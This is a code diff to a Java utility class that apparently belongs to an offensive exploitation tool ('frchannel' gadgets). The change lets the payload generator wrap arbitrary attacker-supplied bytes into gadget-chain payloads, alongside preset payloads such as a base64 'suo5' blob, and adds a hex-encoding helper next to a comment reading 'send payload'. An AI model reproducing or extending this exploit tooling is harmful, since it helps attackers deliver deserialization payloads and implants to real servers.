@@ -13,7 +13,6 @@ import org.apache.http.ssl.SSLContextBuilder;
 import org.apache.http.util.EntityUtils;
 
 import javax.net.ssl.SSLContext;
-import java.lang.reflect.InvocationTargetException;
 import java.util.Base64;
 
 public class Utils
@@ -42,7 +41,7 @@ public class Utils
         return url != null && !url.isEmpty() && (url.startsWith("https://") || url.startsWith("http://"));
     }
 
-    public static byte[] generate(String gadget, String payloadType) throws Exception
+    public static byte[] generate(String gadget, String payloadType, String arg) throws Exception
     {
         byte[] payload = null;
         switch (payloadType) {
@@ -56,12 +55,27 @@ public class Utils
                 payload = Base64.getDecoder().decode(suo5);
                 break;
             default:
+                payload = arg.getBytes();
                 break;
         }
 
         Class<?> gadgetClass = Class.forName("com.h2tg.frchannel.gadget." + gadget);
 
         return (byte[]) gadgetClass.getMethod("getPayload", byte[].class).invoke(null, payload);
+    }
+
+    public static String bytesToHexString(byte[] bArray, int length) {
+        StringBuffer sb = new StringBuffer(length);
+
+        for (int i = 0; i < length; ++i) {
+            String sTemp = Integer.toHexString(255 & bArray[i]);
+            if (sTemp.length() < 2) {
+                sb.append(0);
+            }
+
+            sb.append(sTemp.toUpperCase());
+        }
+        return sb.toString();
     }
 
     // 发送payload
